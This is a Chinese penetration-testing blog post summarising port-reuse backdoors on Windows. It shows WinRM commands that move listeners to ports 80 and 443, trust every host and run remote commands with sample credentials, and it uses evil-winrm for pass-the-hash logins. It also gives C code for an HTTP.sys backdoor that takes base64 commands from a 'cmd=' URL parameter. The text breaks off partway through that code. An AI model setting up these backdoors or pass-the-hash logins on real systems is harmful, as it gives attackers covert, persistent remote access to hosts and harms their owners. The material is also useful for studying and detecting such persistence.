---
title: 端口复用后门总结 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/16798021.html
source: 博客园 - 渗透测试中心
date: 2022-10-18
fetch_date: 2025-10-03T20:07:39.901786
---

# 端口复用后门总结 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [端口复用后门总结](https://www.cnblogs.com/backlion/p/16798021.html "发布于 2022-10-17 09:35")

## WinRM实现端口复用

这种攻击方式前提是需要帐号和密码，如果在获得hash的情况下也可以利用evil-winrm来实现hash登录

### 服务介绍

WinRM全称是Windows Remote Management，是微软服务器硬件管理功能的一部分，能够对本地或远程的服务器进行管理。WinRM服务能够让管理员远程登录Windows操作系统，获得一个类似Telnet的交互式命令行shell，而底层通讯协议使用的是HTTP。

### 后门应用

在windows2012服务器中，winrm默认启动，开启了5985端口，在2008系统中需要手动开启服务

```
winrm quickconfig -q
```

启动后防火墙也会放行该端口
[![20210104174750](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221017093456213-1629237219.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%95%B4%E7%90%86/20210104174750.png "20210104174750")
设置启用httplistener监听并存

```
winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"} //80
winrm set winrm/config/service @{EnableCompatibilityHttpsListener="true"} //443
```

[![20210104174922](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221017093457120-656612533.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%95%B4%E7%90%86/20210104174922.png "20210104174922")

修改监听端口为80/443

```
winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
winrm set winrm/config/Listener?Address=*+Transport=HTTPS　 @{Port="443"}
```

[![20210104175540](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221017093457679-1531144656.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%95%B4%E7%90%86/20210104175540.png "20210104175540")

本地连接也需要开启WinRM服务，然后设置信任连接的主机，

```
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts="*"}
winrs -r:http://172.16.142.151:5985 -u:administrator -p:admin123 "whoami"
```

[![20210105131322](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221017093458685-697141878.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%95%B4%E7%90%86/20210105131322.png "20210105131322")
[![20210105125247](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221017093459478-1485638918.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%95%B4%E7%90%86/20210105125247.png "20210105125247")

### WinRM PTH

mac下使用evil-winrm实施pth

```
sudo gem install evil-winrm
evil-winrm -i 172.16.142.151 -u administrator -H 8842xxxxxxx9c89a -P 80
```

测试了下复用后也是可以pth连接的。
[![20210105131325](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221017093500278-1804921997.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%95%B4%E7%90%86/20210105131325.png "20210105131325")
[![20210105131152](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221017093501239-894180212.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%95%B4%E7%90%86/20210105131152.png "20210105131152")

## HTTP.sys端口复用

### HTTP.sys介绍

这种方法的应用场景是针对IIS，HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys

1 当IIS或者其他的应用使用HTTP Server API去监听请求路径的时候，这些应用需要在HTTP.SYS上面注册url prefix ，关于注册URL的规则，可以参考MSDN: [https://msdn.microsoft.com/en-us/library/windows/desktop/aa364698(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa364698%28v%3Dvs.85%29.aspx) 。这是注册的过程。
2 当一个请求到来并被http.sys获取到，它需要分发这个请求给注册当前url对应的应用，这是路由的过程。

### 劫持程序实现

这样我们可以自己写一个注册url功能的exe，然后根据请求访问url来实现后门功能。
注册代码参考msdn和stackoverflow上的代码：

> <https://stackoverflow.com/questions/14931705/microsoft-c-http-server-api-httpapi-lib-httpreceiveclientcertificate-functio>
> <https://docs.microsoft.com/zh-cn/windows/win32/http/http-server-sample-application>

```
DWORD DoReceiveRequests(IN HANDLE hReqQueue)
{
    ULONG              result;
    HTTP_REQUEST_ID    requestId;
    DWORD              bytesRead;
    PHTTP_REQUEST      pRequest;
    PCHAR              pRequestBuffer;
    ULONG              RequestBufferLength;

    //
    // Allocate a 2 KB buffer. This size should work for most
    // requests. The buffer size can be increased if required. Space
    // is also required for an HTTP_REQUEST structure.
    //
    RequestBufferLength = sizeof(HTTP_REQUEST) + 2048;
    pRequestBuffer = (PCHAR)ALLOC_MEM(RequestBufferLength);

    if (pRequestBuffer == NULL)
    {
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    pRequest = (PHTTP_REQUEST)pRequestBuffer;

    //
    // Wait for a new request. This is indicated by a NULL
    // request ID.
    //

    HTTP_SET_NULL_ID(&requestId);

    for (;;)
    {
        RtlZeroMemory(pRequest, RequestBufferLength);

        result = HttpReceiveHttpRequest(
            hReqQueue,          // Req Queue
            requestId,          // Req ID
            0,                  // Flags
            pRequest,           // HTTP request buffer
            RequestBufferLength,// req buffer length
            &bytesRead,         // bytes received
            NULL                // LPOVERLAPPED
        );
        if (NO_ERROR == result)
        {

            DWORD answer = 0;
            HTTP_SSL_CLIENT_CERT_INFO sslClientCertInfo;
            ULONG bytesReceived;
            answer = HttpReceiveClientCertificate(hReqQueue, pRequest->ConnectionId, 0,
                &sslClientCertInfo, sizeof(HTTP_SSL_CLIENT_CERT_INFO), &bytesReceived, NULL); //注册后等待接收
            char* command;
            char temp[512];
            string cmd_temp;
            strcpy_s(temp, pRequest->pRawUrl);
            command = temp;
            command = strstr(command, "cmd=");
            if (command == NULL)
                continue;
            cmd_temp.assign(command);
            cmd_temp.replace(cmd_temp.find("cmd="), 4, "");
            //------------------------------------
            uint8* text = (uint8*)cmd_temp.c_str();
            uint32 text_len = (uint32)strlen((char*)text);
            uint8 buffer[1024], buffer2[4096];
            uint32 size = base64_decode(text, text_len, buffer);
            buffer[size] = 0;
            //------------------------------------
            printf("%s", buffer);
            if (answer != NO_ERROR)
  ...